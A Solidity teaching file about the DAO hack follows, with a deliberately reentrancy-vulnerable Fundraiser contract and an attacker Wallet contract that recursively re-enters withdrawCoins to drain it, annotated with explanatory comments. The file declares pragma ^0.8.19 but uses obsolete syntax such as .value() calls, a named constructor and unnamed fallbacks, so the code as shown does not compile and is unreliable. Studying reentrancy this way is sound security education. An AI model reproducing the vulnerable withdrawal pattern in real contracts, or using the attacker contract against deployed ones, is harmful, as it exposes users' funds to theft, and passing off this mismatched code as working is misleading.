// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.19;

// This is a study of The Dao $60 million hack and which vulnerability enabled the hack.

contract Fundraiser {
  mapping(address => uint) balances;

  // This function is vulnerable to reentrancy attack, where the attacker makes recursive calls to the function. Notice how the function first
  // makes a payout to the caller before setting the balance to zero. A caller could exploit this to keep making payments out before the function
  // ever getting to change the balance to zero.
  function withdrawCoins() {
    uint withdrawAmount = balances[msg.sender];
    Wallet wallet = Wallet(msg.sender);
    wallet.payout.value(withdrawAmount)(); // In this line, the "payout" function in an external contract. We don't really know what the payout function in that contract is designed to do.
    balances[msg.sender] = 0;
  }

  // Within the "payout" function in the wallet contract, an attacker could recursively call the withdrawCoins() function again, preventing the withdrawCoins
  // function from ever setting the balance to zero and thus draining funds from the contract. See the implementation of the attack below.

  function getBalance() view returns (uint) {
    return address(this).balance;
  }

  function contribute() payable {
    balances[msg.sender] += msg.value;
  }

  function() payable {}
}

contract Wallet {
  Fundraiser fundraiser;
  uint recursion = 20; // Loop counter.

  function Wallet(address fundraiserAddress) {
    fundraiser = Fundraiser(fundraiserAddress);
  }

  function contribute(uint amount) {
    fundraiser.contribute.value(amount)();
  }

  function withdraw() {
    fundraiser.withdrawCoins();
  }

  function getBalance() constant returns (uint) {
    return address(this).balance;
  }

  // Here we will make a recursive call to the withdrawCoins() function in the fundraiser contract, however we can't make infinite calls or we will crash
  // the contract. So we will need a loop (see above for loop counter and below for loop).
  function payout() payable {
    if (recursion > 0) {
      recursion--;
      fundraiser.withdrawCoins(); // When the function payout() is called it will simply call the withdrawCoins() function in the fundraiser contract, creating a recursive behaviour.
    }
  }

  function() payable {}
}
